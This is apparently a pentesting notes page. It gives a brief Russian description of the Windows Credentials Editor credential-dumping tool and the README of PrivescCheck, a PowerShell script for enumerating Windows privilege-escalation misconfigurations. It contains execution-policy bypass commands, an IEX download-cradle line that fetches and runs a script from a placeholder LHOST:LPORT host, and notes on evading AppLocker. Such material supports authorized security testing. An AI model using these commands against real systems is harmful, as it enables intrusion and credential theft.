### Редактор учетных данных Windows [WCE](https://github.com/xymnal/wce)

Для этого инструмента требуются права администратора для создания и добавления / удаления / изменения учетных данных NTLM, а также для сброса паролей в виде открытого текста, хранящихся в пакете безопасности Windows Digest Authentication.

Билеты Kerberos могут быть получены как обычный пользователь, хотя для получения ключей сеанса в зависимости от конфигурации системы могут потребоваться права администратора.

#### [PrivescCheck](https://github.com/itm4n/PrivescCheck)

# PrivescCheck

This script aims to __enumerate common Windows security misconfigurations__ which can be leveraged for privilege escalation and __gather various information__ which might be useful for __exploitation__ and/or __post-exploitation__.

I built on the amazing work done by [@harmj0y](https://twitter.com/harmj0y) and [@mattifestation](https://twitter.com/mattifestation) in [PowerUp](https://github.com/HarmJ0y/PowerUp). I added more checks and also tried to reduce the amount of false positives.

It's still a Work-in-Progress because there are a few more checks I want to implement but it's already quite complete. If you have any suggestion (improvements, features), feel free to contact me on Twitter [@itm4n](https://twitter.com/itm4n).


## Usage 

Use the script from a PowerShell prompt.
```
PS C:\Temp\> Set-ExecutionPolicy Bypass -Scope Process -Force 
PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck 
```

Display output and write to a log file at the same time.
```
PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck | Tee-Object "C:\Temp\result.txt"
```

Use the script from a CMD prompt.
```
C:\Temp\>powershell -ep bypass -c ". .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck"
```

Import the script from a web server.
```
C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-PrivescCheck.ps1'); Invoke-PrivescCheck" 
```


## Yet another Windows Privilege escalation tool, why?

I really like [PowerUp](https://github.com/HarmJ0y/PowerUp) because it can enumerate common vulnerabilities very quickly and without using any third-party tools. The problem is that it hasn't been updated for several years now. The other issue I spotted quite a few times over the years is that it sometimes returns false positives which are quite confusing.

Other tools exist on GitHub but they are __not as complete__ or they have __too many dependencies__. For example, they rely on WMI calls or other command outputs.

Therefore, I decided to make my own script with the following constraints in mind:

- __It must not use third-party tools__ such as `accesschk.exe` from SysInternals.

- __It must not use built-in Windows commands__ such as `whoami.exe` or `netstat.exe`. The reason for this is that I want my script to be able to run in environments where AppLocker (or any other Application Whitelisting solution) is enforced.

- __It must not use built-in Windows tools__ such as `sc.exe` or `tasklist.exe` because you'll often get an __Access denied__ error if you try to use them on __Windows Server 2016/2019__ for instance.

- __It must not use WMI__ because its usage can be restricted to admin-only users.

- Last but not least, it must be compatible with __PowerShell Version 2__. 


## Addressing all the constraints...

- __Third-party tools__

I have no merit, I reused some of the code made by [@harmj0y](https://twitter.com/harmj0y) and [@mattifestation](https://twitter.com/mattifestation). Indeed, PowerUp has a very powerfull function called `Get-ModifiablePath` which checks the ACL of a given file path to see if the current user has write permissions on the file or folder. I modified this function a bit to avoid some false positives though. Before that a service command line argument such as `/svc`could be identified as a vulnerable path because it was interpreted as `C:\svc`. My other contribution is that I made a _registry-compatible_ version of this function (`Get-ModifiableRegistryPath`).

- __Windows built-in windows commands/tools__

When possible, I naturally replaced them with built-in PowerShell commands such as `Get-Process`. In other cases, such as `netstat.exe`, you won't get as much information as you would with basic PowerShell commands. For example, with PowerShell, TCP/UDP listeners can easily be listed but there is no easy way to get the associated Process ID. In this case, I had to invoke Windows API functions.

- __WMI__

You can get a looooot of information through WMI, that's great! But, if you face a properly hardened machine, the access to this interface will be restricted. So, I had to find workarounds. And here comes the __Registry__! Common checks are based on some registry keys but it has a lot more to offer. The best example is services. You can get all the information you need about every single service (except their current state obviously) simply by browsing the registry. This is a huge advantage compared to `sc.exe` or `Get-Service` which depend on the access to the __Service Control Manager__. 

- __PowerShellv2 support__

This wasn't that easy because newer version of PowerShell have very convenient functions or options. For example, the `Get-LocalGroup`function doesn't exist and `Get-ChildItem` doesn't have the `-Depth` option in PowerShellv2. So, you have to work your way around each one of these small but time-consuming issues.
